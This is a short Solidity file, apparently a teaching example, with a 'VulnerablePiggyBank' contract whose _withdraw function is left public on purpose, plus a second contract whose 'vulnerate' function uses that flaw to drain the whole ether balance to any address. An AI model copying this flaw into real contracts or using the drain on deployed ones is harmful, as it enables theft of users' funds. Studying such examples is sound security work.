// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract VulnerablePiggyBank {
    mapping(address => uint) public balances;
    event WithdrawEvent(address,uint);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public payable {
        uint balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        balances[msg.sender] =0;
        // Transfer balance using a reusable _withdraw function 
        _withdraw(msg.sender,balance);
    }

    //should be internal!!
    function _withdraw(address toAddress, uint balance) public {
        payable(toAddress).transfer(balance);
        emit WithdrawEvent(toAddress,balance);
    }
    
}

contract UsingVulnerablePiggyBank {

    VulnerablePiggyBank _piggyBank;

    constructor(address piggyBank){
        _piggyBank = VulnerablePiggyBank(piggyBank);
    }
  
    function vulnerate(address to) public{
        uint etherInVulnerableContract = address(_piggyBank).balance;
        _piggyBank._withdraw(to,etherInVulnerableContract);
    }
   
    
}